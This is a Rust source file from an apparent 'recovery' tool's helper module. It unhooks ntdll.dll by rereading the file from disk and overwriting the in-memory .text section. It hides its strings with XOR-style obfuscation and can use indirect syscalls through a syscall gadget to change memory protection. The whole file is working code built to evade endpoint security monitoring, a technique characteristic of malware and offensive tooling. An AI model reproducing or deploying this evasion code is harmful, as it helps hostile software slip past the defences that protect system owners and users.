use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
use crate::recovery::helpers::pe::{
    IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};
use std::fs;
use tracing::{debug, info};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::core::PCWSTR;

pub fn unhook_ntdll(syscall_manager: Option<&SyscallManager>) -> Result<(), Box<dyn std::error::Error>> {
    info!("attempting to unhook ntdll.dll by reloading from disk");

    unsafe {
        // "ntdll.dll"
        let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
        let h_ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr()))?;
        let ntdll_base = h_ntdll.0 as *const u8;

        // "C:\\Windows\\System32\\ntdll.dll"
        let ntdll_path = deobf(&[
            0xF8, 0x81, 0x07, 0x0C, 0x22, 0x25, 0x2F, 0x24, 0x3C, 0x28, 0x07, 0x18, 0x32, 0x38,
            0x3F, 0x2E, 0x26, 0x36, 0x78, 0x79, 0x07, 0x25, 0x3F, 0x2F, 0x27, 0x27, 0x65, 0x2F,
            0x27, 0x27,
        ]);
        let ntdll_disk_bytes = fs::read(&ntdll_path)?;

        let dos_header = &*(ntdll_base as *const IMAGE_DOS_HEADER);
        let nt_headers = &*(ntdll_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);

        let disk_dos_header = &*(ntdll_disk_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
        let _disk_nt_headers = &*(ntdll_disk_bytes.as_ptr().add(disk_dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);

        let section_header_ptr = (ntdll_base.add(dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())) as *const IMAGE_SECTION_HEADER;

        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            let section_name = std::str::from_utf8(&section.name)?.trim_matches('\0');

            if section_name == ".text" {
                let mut old_protect = 0u32;
                let mut addr = ntdll_base.add(section.virtual_address as usize) as *mut std::ffi::c_void;
                let mut size = section.misc as usize;

                debug!(
                    section = section_name,
                    addr = ?addr,
                    size = size,
                    "restoring section from disk"
                );

                if let Some(mgr) = syscall_manager {
                    indirect_syscall_5(
                        mgr.nt_protect_virtual_memory_ssn,
                        mgr.syscall_gadget,
                        -1,
                        &mut addr as *mut _ as isize,
                        &mut size as *mut _ as isize,
                        PAGE_EXECUTE_READWRITE.0 as isize,
                        &mut old_protect as *mut _ as isize,
                    );
                } else {
                    use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VirtualProtect};
                    let mut op = PAGE_PROTECTION_FLAGS::default();
                    VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &mut op)?;
                    old_protect = op.0;
                }

                let disk_section_ptr = ntdll_disk_bytes.as_ptr().add(section.pointer_to_raw_data as usize);
                std::ptr::copy_nonoverlapping(disk_section_ptr, addr as *mut u8, section.size_of_raw_data as usize);

                let mut temp = 0u32;
                if let Some(mgr) = syscall_manager {
                    indirect_syscall_5(
                        mgr.nt_protect_virtual_memory_ssn,
                        mgr.syscall_gadget,
                        -1,
                        &mut addr as *mut _ as isize,
                        &mut size as *mut _ as isize,
                        old_protect as isize,
                        &mut temp as *mut _ as isize,
                    );
                } else {
                    use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VirtualProtect};
                    let mut op = PAGE_PROTECTION_FLAGS::default();
                    VirtualProtect(addr, size, windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(old_protect), &mut op)?;
                }
                
                info!("successfully unhooked .text section of ntdll.dll");
                return Ok(());
            }
        }
    }

    Err("failed to find .text section in ntdll.dll".into())
}